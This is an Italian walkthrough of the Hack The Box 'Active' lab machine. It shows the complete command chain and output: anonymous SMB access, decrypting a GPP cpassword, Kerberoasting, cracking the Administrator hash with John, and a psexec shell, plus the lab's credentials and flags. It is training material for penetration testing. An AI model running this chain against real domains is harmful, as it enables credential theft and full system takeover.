# Active
* **POINTS**: 0
* **USER RATING**: Easy
* **OPERATING SYSTEM**: Windows
* **RATING**: 4.9

## 1. Recon
```shell
└─$ nmap -sC -sV -oA nmap/initial 10.10.10.100
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 16:40 EDT
Nmap scan report for 10.10.10.100 (10.10.10.100)
Host is up (0.13s latency).
Not shown: 985 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
88/tcp    open  kerberos-sec?
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap?
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 12s
| smb2-time: 
|   date: 2022-06-21T20:43:31
|_  start_date: 2022-06-21T20:38:04
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 190.97 seconds
```

## 2. SMB
```shell
└─$ smbmap -H 10.10.10.100
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
```

Siccome solo *Replication* è accessibile, vediamo cosa c'è

```shell
─$ smbclient //10.10.10.100/Replication -U ""%""                                                                                                                                                                                            
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

                5217023 blocks of size 4096. 284761 blocks available
smb: \> cd active.htb
smb: \active.htb\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 06:37:44 2018
  Policies                            D        0  Sat Jul 21 06:37:44 2018
  scripts                             D        0  Wed Jul 18 14:48:57 2018

                5217023 blocks of size 4096. 284745 blocks available
```

Quindi ci scarichiamo la directory *active.htb* con il seguente comando:

```bash
└─$ smbclient //10.10.10.100/Replication -N -c 'prompt OFF; recurse OFF; cd /active.htb; lcd ~/Scrivania/Active; mget *'
Anonymous login successful
chdir to ~/Scrivania/Active failed (File o directory non esistente)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0,0 KiloBytes/sec) (average 0,0 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0,0 KiloBytes/sec) (average 0,0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0,2 KiloBytes/sec) (average 0,1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (5,3 KiloBytes/sec) (average 1,4 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (1,0 KiloBytes/sec) (average 1,3 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (2,1 KiloBytes/sec) (average 1,5 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (7,1 KiloBytes/sec) (average 2,3 KiloBytes/sec)
```

Sono state estratte le seguenti cartelle:

<p align="center">
  <img src="Images/ext.png" />
</p>

Dopo aver visto alcuni file presenti, in */Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/* si è notata la presenza di un file denominato *Group.xml*:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

Facendo una ricerca su Google ho trovato un articolo che parla del [GPP](https://mindpointgroup.com/blog/privilege-escalation-via-group-policy-preferences-gpp) (Group Policy Preferences) nella quale spiega anche come craccare la password.

```bash
└─$ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18
```

Avendo la password, possiamo accedere al servizio smb con le credenziali trovate

```shell
└─$ smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18      
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                5217023 blocks of size 4096. 279738 blocks available
```

Andando in "*/SVC_TGS/Desktop*" troviamo la user flag (che scarichiamo): `28c87548f9ab78a720b3bb15fe8d5e9d`

## 3. Privilege Escalation
Siccome c'è *Kerberos* proviamo a fare **Kerberoasting** aiutandoci con **GetUserSPNs** di [impacket](https://github.com/SecureAuthCorp/impacket)

```shell
└─$ impacket-GetUserSPNs -dc-ip 10.10.10.100 -request active.htb/SVC_TGS:GPPstillStandingStrong2k18               
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation                                                            
                                                                                                                    
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation                                                                       
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------                                                                       
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2022-06-22 13:55:33.493362             



$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$8f410c86adcd0c75896e222fdc0bdc57$c184b35f4f91825167193a299348125d7cb4b7bf4ef34bdda178f38aba8ac0b083bccd2038164b9ad339ca2f484b70a682eb925dfaf90506d95e0b0b38c0fe377486266f0100b0526fa8d6c8a0141b4cb78a7d5bf528e5d9aa717fb7510532ff2f83c77a59b83bf9db7eb95cf02b71dec181172a6d017549f3e19d60b0a9cdaaa644b18ca0a26637deaadf7488fe7283c085837f370134013a3a8563c39422b1843e7801604264a5bac2d89e71958ee2a58cb5edfba0cde17e05955d4a44c08f757cfa90c9747f06b48896e00fd39873012fd543691fbf0c30084a174dce656b1e0e200cbfe1ed2aa63c9f152e88501d4c10b034c54c14a0131c09831da9b600b86b2f0633ead7dd99b1e09a34d7659a50e7a2c02faf3ebccc438d8efa33194be47087211fd7a7477224d69f7f44e9c3b2f92a47ac9f72d6a1a5d6d1df9d4d84948582727a025e8a8ee60d6495aa59900221c4683a0895e2167fe94ff52172cfb0914dc3424b7316e03772a76040baf1a14c2052ff1647dd8f2fce7ed7728664f29ac03e918f7525d8abe727140268fc6e2f390396823fa7c62045aba56e82efed9b86212ef1eb2777f9afeacb0c6ab9b06a7a66ef01cfb439dc08a3b591dcab212d6c5336137c922aeaad4a540d802977fdca5200398301971a12022976c9b5fbdfecb800646f2842ac3fa0c7a23b28afb887d996bf74eb863d8dfdf33a84dbe83d78625daf25bb412fc889cf61bbdd883a4ce8944f5e54fb6dd9f04f92bf0566b71b42e0cffee9178eba882fc8858820c0967ea29cc972d40c1a86e8336df496148e24fecad64bd47aae2889dba6c979ac0a649134b612bf307474e2319cf99d5498113a0c7d6c87db70ed71e241a2b02fed9351d5a21d72edb70bec50f69f940a8dca830f80b2f9b2bb882318e00ea8cc329ea407307556a40675e3f82a4c865c50b6b65c144d4d7a6cb4fa4804199dfde6f81d9945f25595b05637fecf8faedbf10b88f262f1e02fc08559ebd86ad42b2743d643de32a102f6ede47cd535f3ae087ee84c9b490cf135c78bfe8418b6a1fe1c41d95c2800c9805ee00075e15753ceeaf955fb8df6195fe575d3ab102e58d231c5a750c685343948fa4e3db8f6e5f281f3c9040689755ec89e41befcab673ba97a40e9096c190d58eea97af3253ea517c2b17366038f4dc0fc70f6a07c38ef5b5f5aeb45586810c326b0fe1bf4e8881fd3443d5c29cf1f35340d763331fb11ca7a51c537ab35
```

Abbiamo la password dell'amministratore sottoforma di hash. Proviamo a creccarla con [John The Ripper](https://www.openwall.com/john/)

```shell
└─$ john admin.hash -w=../rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:14 DONE (2022-06-22 17:40) 0.07027g/s 740511p/s 740511c/s 740511C/s Tiffani143..TiagoTorrao
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Abbiamo la password !

Ora utilizziamo **psexec** (sempre di impacket) per avere la shell

```shell
└─$ impacket-psexec administrator:Ticketmaster1968@10.10.10.100
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file dbCIWsDx.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service Avtb on 10.10.10.100.....
[*] Starting service Avtb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

In */User/Administrator/Desktop* abbiamo la root flag: `c74335fc753f83294414afe82abac70d`
